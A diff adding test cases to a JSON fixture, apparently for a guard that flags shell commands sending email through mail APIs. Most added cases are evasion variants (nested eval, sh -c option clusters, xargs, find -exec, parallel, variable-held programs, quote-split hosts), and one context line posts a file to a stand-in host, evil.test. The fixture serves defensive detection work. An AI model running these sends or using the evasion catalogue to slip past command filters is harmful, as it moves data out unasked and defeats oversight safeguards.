@@ -3903,6 +3903,1066 @@
       "name": "CURLMAILAPI1118: round 11 (review): W10 mail host followed by a backslash and a foreign host",
       "cmd": "curl -d @m.json 'https://api.resend.com\\@evil.test/emails'",
       "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: E15 eval of sendmail through a variable-free heredoc string",
+      "cmd": "eval \"$(printf 'curl -X POST https://api.resend.com/emails -d x')\"",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: E16 eval in a function",
+      "cmd": "f(){ eval \"$@\"; }; f curl -X POST https://api.resend.com/emails -d x",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: X15 xargs feeds the method and the URL (Graph)",
+      "cmd": "echo -X POST https://graph.microsoft.com/v1.0/me/sendMail | xargs curl -d @m.json",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: D08 eval via a variable name of the builtin",
+      "cmd": "e=eval; $e 'curl -X POST https://api.resend.com/emails -d x'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: D12 find -exec curl with a placeholder",
+      "cmd": "find . -name 'u*' -exec curl -d @m.json https://api.resend.com/emails/{} \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: D13 parallel curl",
+      "cmd": "echo https://api.resend.com/emails | parallel curl -d @m.json",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: F29 xargs template is the fed word (client comes from stdin)",
+      "cmd": "echo curl -d @m.json https://api.resend.com/emails | xargs -I{} sh -c '{}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: F30 xargs feeds the whole command to eval",
+      "cmd": "echo 'curl -d @m.json https://api.resend.com/emails' | xargs -I{} eval {}",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: F31 xargs runs the fed word as the program",
+      "cmd": "echo curl -d @m.json https://api.resend.com/emails | xargs env",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: H08 bash -c -l (option after -c)",
+      "cmd": "bash -c -l 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: H12 ksh -xc",
+      "cmd": "ksh -xc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: H18 bash -c -- program",
+      "cmd": "bash -c -- 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: H22 a script with a -c looking argument stops, as on develop (develop's -c reading is kept so an unknown shell option cannot hide a program)",
+      "cmd": "bash run.sh -lc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: I12 xargs -S 100 -R 2 -I{} sh -c (BSD)",
+      "cmd": "echo https://api.resend.com/emails | xargs -S 100 -R 2 -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: J05 four deep sh -c with a host split by quotes at the innermost level",
+      "cmd": "sh -c 'sh -c \"sh -c \\\"sh -c curl\\\\ -d\\\\ x\\\\ https://api.re\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\"send.com/emails\\\"\"'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: J08 five evals around mail -s",
+      "cmd": "eval eval eval eval eval mail -s x a@b.example",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: a program from a variable, no send marker on the line",
+      "cmd": "$EDITOR notes.txt",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: eval \"$@\" with no send marker",
+      "cmd": "f(){ eval \"$@\"; }; f ls -la",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: find -exec rm",
+      "cmd": "find . -name '*.tmp' -exec rm {} \\;",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: parallel gzip",
+      "cmd": "ls *.log | parallel gzip",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: parallel curl download, no mail host",
+      "cmd": "cat urls.txt | parallel curl -s -O",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: a shell script whose argument looks like -c",
+      "cmd": "bash script.sh -c foo",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: Graph calendar read through xargs",
+      "cmd": "echo https://graph.microsoft.com/v1.0/me/events | xargs curl -s",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: xargs env with no send marker",
+      "cmd": "echo FOO=1 | xargs env",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: control: bash -euo pipefail -c harmless",
+      "cmd": "bash -euo pipefail -c 'echo ok'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: bash -euo pipefail -c send",
+      "cmd": "bash -euo pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: mksh -c send",
+      "cmd": "mksh -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: find -execdir with a literal send",
+      "cmd": "find . -name m.json -execdir curl -d @{} https://api.sendgrid.com/v3/mail/send \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: parallel with ::: and a send URL",
+      "cmd": "parallel curl -d @m.json ::: https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H01 bash -cl (c first in the cluster)",
+      "cmd": "bash -cl 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H02 bash -lic",
+      "cmd": "bash -lic 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H03 bash --login -c",
+      "cmd": "bash --login -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H04 bash -o errexit -c",
+      "cmd": "bash -o errexit -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H05 bash -O extglob -c",
+      "cmd": "bash -O extglob -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H06 bash --rcfile f -c",
+      "cmd": "bash --rcfile /dev/null -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H07 bash --norc --noprofile -c",
+      "cmd": "bash --norc --noprofile -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H09 bash +x -c",
+      "cmd": "bash +x -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H10 zsh -lc",
+      "cmd": "zsh -lc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H11 dash -ec",
+      "cmd": "dash -ec 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H13 /bin/bash -lc",
+      "cmd": "/bin/bash -lc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H14 env bash -lc",
+      "cmd": "env bash -lc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H15 sudo -u x bash -lc",
+      "cmd": "sudo -u x bash -lc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H17 bash -lc with sendmail",
+      "cmd": "bash -lc 'sendmail a@b.example < m.txt'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H19 bash -lc, program in double quotes with a variable URL and an assignment",
+      "cmd": "U=https://api.resend.com/emails; bash -lc \"curl -d @m.json $U\"",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H20 control: bash -lc harmless",
+      "cmd": "bash -lc 'echo hello'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: H21 control: bash -lc read",
+      "cmd": "bash -lc 'curl -s https://api.sendgrid.com/v3/stats'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I01 xargs -P 4 -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs -P 4 -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I02 xargs -L 1 -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs -L 1 -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I03 xargs --max-procs=4 -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs --max-procs=4 -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I04 xargs --max-procs 4 -I {} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs --max-procs 4 -I {} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I05 xargs -d newline -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs -d '\\n' -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I06 xargs -E EOF -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs -E EOF -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I07 xargs -a f -I{} sh -c (host in the template only by name)",
+      "cmd": "xargs -a u.txt -I{} sh -c 'curl -d @m.json https://api.resend.com/{}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I08 xargs -t -r -0 -I{} sh -c",
+      "cmd": "printf https://api.resend.com/emails | xargs -t -r -0 -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I09 xargs --verbose -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs --verbose -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I10 xargs --process-slot-var=S -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs --process-slot-var=S -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I11 xargs --process-slot-var S -I{} sh -c",
+      "cmd": "echo https://api.resend.com/emails | xargs --process-slot-var S -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I13 xargs -n 1 -P 8 -I % bash -lc",
+      "cmd": "echo https://api.resend.com/emails | xargs -n 1 -P 8 -I % bash -lc 'curl -d @m.json %'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I14 xargs -n1 -I{} sh -c with the URL in a variable of the inner shell",
+      "cmd": "echo https://api.resend.com/emails | xargs -n 1 -I{} sh -c 'U={}; curl -d @m.json \"$U\"'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I15 xargs -I{} after a quoted delimiter option",
+      "cmd": "echo https://api.resend.com/emails | xargs --delimiter=, -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I16 xargs --delimiter , -I{}",
+      "cmd": "echo https://api.resend.com/emails | xargs --delimiter , -I{} sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I17 xargs -n 1 sh -c with $0 (no replace string)",
+      "cmd": "echo https://api.resend.com/emails | xargs -n 1 sh -c 'curl -d @m.json $0'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I18 control: xargs -n 1 -I{} sh -c harmless",
+      "cmd": "ls | xargs -n 1 -I{} sh -c 'echo {}'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: I19 control: the -I belongs to the template, not to xargs",
+      "cmd": "echo x | xargs -n 1 grep -I {} f.txt",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J01 command command eval",
+      "cmd": "command command eval 'curl -X POST https://api.resend.com/emails -d x'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J02 builtin command builtin eval",
+      "cmd": "builtin command builtin eval 'curl -X POST https://api.resend.com/emails -d x'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J03 command -p -- eval",
+      "cmd": "command -p -- eval 'curl -X POST https://api.resend.com/emails -d x'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J04 control: command -v eval",
+      "cmd": "command -v eval",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J06 five evals around a Graph send",
+      "cmd": "eval eval eval eval eval curl -X POST -d @m.json https://graph.microsoft.com/v1.0/me/sendMail",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review: J07 five evals around sendmail",
+      "cmd": "eval eval eval eval eval sendmail a@b.example",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K02 find -exec sh -c with a literal send",
+      "cmd": "find . -maxdepth 1 -exec sh -c 'curl -d @m.json https://api.resend.com/emails' \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K03 find -exec curl ... {} +",
+      "cmd": "find . -name '*.json' -exec curl -X POST https://api.sendgrid.com/v3/mail/send -d @{} +",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K04 find -execdir wget",
+      "cmd": "find . -name m.json -execdir wget --post-file {} https://api.sendgrid.com/v3/mail/send \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K05 find -exec with a quoted semicolon",
+      "cmd": "find . -name m.json -exec curl -d @m.json https://api.resend.com/emails ';'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K06 find -exec bash -lc",
+      "cmd": "find . -name m.json -exec bash -lc 'curl -d @m.json https://api.resend.com/emails' \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K07 sudo find -exec sendmail",
+      "cmd": "sudo find /tmp -name m.txt -exec sendmail a@b.example \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K08 find with two -exec, the second sends",
+      "cmd": "find . -name m.json -exec echo {} \\; -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K09 find -ok",
+      "cmd": "find . -name m.json -ok curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K10 find -exec with the program as the found path",
+      "cmd": "find ~/bin -name 'send*' -exec {} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K11 control: find -exec grep",
+      "cmd": "find . -name '*.md' -exec grep -l resend {} \\;",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K12 control: find without exec, mail host in a name pattern",
+      "cmd": "find . -name 'api.resend.com*'",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K14 parallel -j4 curl {} :::",
+      "cmd": "parallel -j4 curl -d @m.json {} ::: https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K15 parallel with the template as one quoted string",
+      "cmd": "parallel \"curl -d @m.json {}\" ::: https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K16 parallel --jobs 2 -k wget",
+      "cmd": "parallel --jobs 2 -k wget --post-file m.json ::: https://api.sendgrid.com/v3/mail/send",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K17 pipe into parallel sh -c",
+      "cmd": "echo https://api.resend.com/emails | parallel sh -c 'curl -d @m.json {}'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K18 parallel with a literal send in the template",
+      "cmd": "seq 3 | parallel -n0 curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K19 control: parallel gzip",
+      "cmd": "ls *.log | parallel gzip {}",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K20 program from a variable assigned on the line",
+      "cmd": "c=curl; $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K21 quoted variable program",
+      "cmd": "\"$CMD\" -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K22 braces variable program",
+      "cmd": "${CMD} -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K23 program from a command substitution",
+      "cmd": "$(which curl) -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K24 program from backticks",
+      "cmd": "`which curl` -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K25 array program",
+      "cmd": "c=(curl -d @m.json); \"${c[@]}\" https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K26 command $c",
+      "cmd": "c=curl; command $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K27 env $c",
+      "cmd": "c=curl; env $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K28 exec $c",
+      "cmd": "c=curl; exec $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K29 nohup $c in the background",
+      "cmd": "c=curl; nohup $c -d @m.json https://api.resend.com/emails &",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K30 time $c",
+      "cmd": "c=curl; time $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K31 sudo $c",
+      "cmd": "c=curl; sudo $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K32 variable program, host split by quotes",
+      "cmd": "c=curl; $c -d @m.json https://api.re''send.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K33 variable program, Graph send URL",
+      "cmd": "c=curl; $c -X POST -d @m.json https://graph.microsoft.com/v1.0/me/sendMail",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K34 eval of a variable holding the whole send",
+      "cmd": "CMD='curl -d @m.json https://api.resend.com/emails'; eval \"$CMD\"",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K35 the variable run directly, no eval",
+      "cmd": "CMD='curl -d @m.json https://api.resend.com/emails'; $CMD",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K36 variable program after a pipe",
+      "cmd": "c=curl; cat m.json | $c -d @- https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K37 variable program in a subshell and group",
+      "cmd": "c=curl; ( { $c -d @m.json https://api.resend.com/emails; } )",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K38 variable program after timeout and nice",
+      "cmd": "c=curl; timeout 30 nice -n 5 $c -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K39 variable program, path prefix variable",
+      "cmd": "$BIN/curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K44 control: variable program, Graph read (new stop expected by the rule)",
+      "cmd": "$c -s https://graph.microsoft.com/v1.0/me/messages",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K45 control: variable program, mail API read",
+      "cmd": "$c -s https://api.sendgrid.com/v3/stats",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: K46 control: literal echo of a mail host with a variable elsewhere",
+      "cmd": "echo \"$X\" https://api.resend.com/emails",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L01 zsh --emulate sh -c",
+      "cmd": "zsh --emulate sh -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L02 bash -o errexit -o pipefail -c",
+      "cmd": "bash -o errexit -o pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L03 bash -x -eo pipefail -c",
+      "cmd": "bash -x -eo pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L05 control: bash run.sh -c with a send text",
+      "cmd": "bash run.sh -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L07 bash with an = long option before -c",
+      "cmd": "bash --rcfile=/dev/null -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L08 zsh -o NO_NOMATCH -c",
+      "cmd": "zsh -o NO_NOMATCH -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L09 dash -c after +e",
+      "cmd": "dash +e -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L10 sh -c with cluster -oe",
+      "cmd": "sh -oe errexit -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L11 bash -c after a lone dash",
+      "cmd": "bash - -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L12 xargs -S (BSD) right before the template",
+      "cmd": "echo x | xargs -S curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 2: L13 xargs -R (BSD) right before the template",
+      "cmd": "echo x | xargs -R curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M01 find: second -exec after -print",
+      "cmd": "find . -name m.json -exec echo {} \\; -print -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M02 find: second -exec after -o",
+      "cmd": "find . -name m.json -exec false \\; -o -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M03 find: second -exec after -a",
+      "cmd": "find . -name m.json -exec echo {} \\; -a -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M04 find: second -exec after -name",
+      "cmd": "find . -exec echo {} \\; -name m.json -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M05 find: second -exec after a comma",
+      "cmd": "find . -name m.json -exec echo {} \\; , -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M06 find: second -exec after !",
+      "cmd": "find . -exec echo {} \\; ! -name x -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M07 find: second -exec inside a group",
+      "cmd": "find . -exec echo {} \\; \\( -name m.json -exec curl -d @{} https://api.resend.com/emails \\; \\)",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M08 find: second is -execdir after -print",
+      "cmd": "find . -exec echo {} \\; -print -execdir curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M09 find: second -exec sh -c after -print",
+      "cmd": "find . -exec echo {} \\; -print -exec sh -c 'curl -d @m.json https://api.resend.com/emails' \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M10 find: second -exec sendmail after -type f",
+      "cmd": "find . -exec echo {} \\; -type f -exec sendmail a@b.example \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M11 find: three -exec, third sends",
+      "cmd": "find . -exec echo {} \\; -exec echo {} \\; -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M12 find: first -exec ends with +, second sends",
+      "cmd": "find . -exec echo {} + -exec curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M13 find: quoted semicolon then -print -exec",
+      "cmd": "find . -exec echo {} ';' -print -exec curl -d @{} https://api.resend.com/emails ';'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M15 find: -ok after -print",
+      "cmd": "find . -exec echo {} \\; -print -ok curl -d @{} https://api.resend.com/emails \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M16 find: -delete then -exec",
+      "cmd": "find . -name m.json -exec echo {} \\; -prune -exec wget --post-file {} https://api.sendgrid.com/v3/mail/send \\;",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M17 control: a segment starting with -exec echo only",
+      "cmd": "find . -exec echo {} \\; -exec echo done \\;",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M18 control: find -exec echo then -print",
+      "cmd": "find . -name m.json -exec echo {} \\; -print",
+      "expected": false
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M20 sh -o pipefail -e -c",
+      "cmd": "sh -o pipefail -e -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M21 bash -oe pipefail -c",
+      "cmd": "bash -oe pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M22 zsh -5 -c",
+      "cmd": "zsh -5 -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M23 zsh -O -c",
+      "cmd": "zsh -O -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M26 bash +o posix -c",
+      "cmd": "bash +o posix -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M28 bash +O extglob -c",
+      "cmd": "bash +O extglob -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M29 bash -oe pipefail -xc (cluster after the value)",
+      "cmd": "bash -oe pipefail -xc 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M30 zsh -o errexit -5 -c",
+      "cmd": "zsh -o errexit -5 -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M31 sh -euc with a following name word",
+      "cmd": "sh -euc 'curl -d @m.json https://api.resend.com/emails' name",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M35 bash -co pipefail program",
+      "cmd": "bash -co pipefail 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M36 env bash -oe pipefail -c",
+      "cmd": "env X=1 bash -oe pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M37 xargs sh -oe pipefail -c",
+      "cmd": "echo x | xargs sh -oe pipefail -c 'curl -d @m.json https://api.resend.com/emails'",
+      "expected": true
+    },
+    {
+      "name": "MAILRUNTIMECMD1126: review 3: M38 eval zsh -5 -c",
+      "cmd": "eval \"zsh -5 -c 'curl -d @m.json https://api.resend.com/emails'\"",
+      "expected": true
+    },
+    {
